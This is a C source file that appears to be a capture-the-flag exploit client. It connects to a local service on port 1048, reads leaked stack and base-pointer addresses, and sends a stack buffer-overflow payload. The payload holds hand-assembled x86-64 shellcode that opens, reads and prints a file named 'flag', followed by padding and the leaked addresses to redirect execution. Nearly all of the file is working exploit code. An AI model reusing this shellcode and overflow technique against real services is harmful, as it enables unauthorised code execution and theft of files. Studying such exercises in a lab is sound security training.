#include <sys/socket.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

char *littleEndianConversion(char *cliInput);

int main(void)
{
	int sockfd = -1;
	int status;
	ssize_t size;
	int exitcode = EXIT_FAILURE;
	struct addrinfo hints = {.ai_socktype = SOCK_STREAM};
	struct addrinfo *servinfo = NULL, *p;
	char buf[BUFSIZ];

	/* Lookup host. */
	status = getaddrinfo("127.0.0.1", "1048", &hints, &servinfo);
	if (0 != status)
	{
		fprintf(stderr, "Error looking up LH:1048 %s\n", gai_strerror(status));
		goto done;
	}

	/* Connect to host; first option that works wins. */
	for (p = servinfo; p != NULL; p = p->ai_next)
	{
		sockfd = socket(p->ai_family, p->ai_socktype, 0);
		if (-1 == sockfd)
		{
			continue;
		}

		if (-1 == connect(sockfd, p->ai_addr, p->ai_addrlen))
		{
			close(sockfd);
			sockfd = -1;
			continue;
		}

		break;
	}

	if (-1 == sockfd)
	{
		fprintf(stderr, "failed to connect\n");
		goto done;
	}
	// open "flag" -> read "flag" -48(%rbp) -> write -48(%rbp)
	unsigned char overflowBuf[129] = {
		// open() (27)
		"\x48\x8d\x7d\xfb" // (4)
		"\x48\xc7\xc6\x00\x00\x00\x00" //
		"\x48\xc7\xc2\x00\x00\x00\x00" //
		"\x48\xc7\xc0\x02\x00\x00\x00" //
		"\x0f\x05" // (2)
		// read()
		"\x48\x89\xc7" // (3)
		"\x48\x8d\x75\x08" // (4)
		"\x48\xc7\xc2\x30\x00\x00\x00" // 7*8
		"\x48\xc7\xc0\x00\x00\x00\x00"
		"\x0f\x05" // (2)
		// write()
		"\x48\xc7\xc7\x01\x00\x00\x00"
		"\x48\x8d\x75\x08" // (4)
		"\x48\xc7\xc2\x30\x00\x00\x00"
		"\x48\xc7\xc0\x01\x00\x00\x00"
		"\x0f\x05" // (2)
		"aaaaaaaabbbbbbbb" // (16)
		"aaaaaaaabbbbbbbbaaaaaaaa" // (24)
		"cccccc" // (6)
		"flag\x00" // (5)
	};
	// 00007fffffffde30 buffer
	// 00007fffffffdeb0 bp

	// open("file", O_RDONLY ,0);
	/* Read all bytes from host, and write them to stdout. */
	for (;;)
	{
		size = recv(sockfd, buf, BUFSIZ - 1, 0);
		if (0 == size)
		{
			break;
		}
		else if (size > 0)
		{
			write(STDOUT_FILENO, buf, size);
			char buf1[size]; // dummy buffer
			char basePtr[size];
			char stackPtr[size];
			sscanf(buf, "%s %s %s %s", buf1, stackPtr, buf1, basePtr); // buffer: (topofstack) \n bp: %rbp
			littleEndianConversion(basePtr);
			littleEndianConversion(stackPtr);
			int retSend = send(sockfd, overflowBuf, sizeof(overflowBuf), 0);
			if (retSend < 0)
			{
				fprintf(stderr, "Error sending bytes\n");
			}
			else {
				// printf("%d\n",retSend);
			}

			unsigned long buffer = 0, bp = 0;
			// SENDING BP
			if(sscanf(basePtr, "%lx", &bp) == 1)
			{
				// printf("[SENDING]: bp-> %lx %lu\n", bp, sizeof(bp));
			}
			// bp = strtol(stackPtr, &endptr1, 16);

			retSend = send(sockfd, &bp, sizeof(bp), 0);
			if (retSend < 0)
			{
				fprintf(stderr, "Error sending bytes\n");
			}
			// BUFFER SENDING
			if(sscanf(stackPtr, "%lx", &buffer) == 1)
			{ 
				// printf("[SENDING]: buffer-> %lx %lu\n", buffer, sizeof(buffer));
			}

			retSend = send(sockfd, &buffer, sizeof(buffer), 0);
			if (retSend < 0)
			{
				fprintf(stderr, "Error sending bytes\n");
			}
			// send(sockfd, "\n", 1, 0);
		}
		else
		{
			perror("error reading from socket");
			goto done;
		}
	}

	exitcode = EXIT_SUCCESS;

done:
	if (-1 != sockfd)
	{
		close(sockfd);
	}

	if (NULL != servinfo)
	{
		freeaddrinfo(servinfo);
	}

	exit(exitcode);
}

char *littleEndianConversion(char *cliInput)
{
	char strBuffer[strlen(cliInput) + 1];
	int reverseIdx = (int)strlen(cliInput) - 1;
	strcpy(strBuffer, cliInput);
	char temp = 0;
	int idx = 1;
	int i;

	// reverse string
	for (i = 0; i < strlen(cliInput); i++)
	{
		*(cliInput + reverseIdx) = *(strBuffer + i);
		reverseIdx--;
	}
	// swap every 2 positions from start of string
	for (i = 0; i < strlen(cliInput); i += 2)
	{
		temp = *(cliInput + i);
		*(cliInput + i) = *(cliInput + idx);
		*(cliInput + idx) = temp;
		idx += 2;
	}
	return cliInput;
}
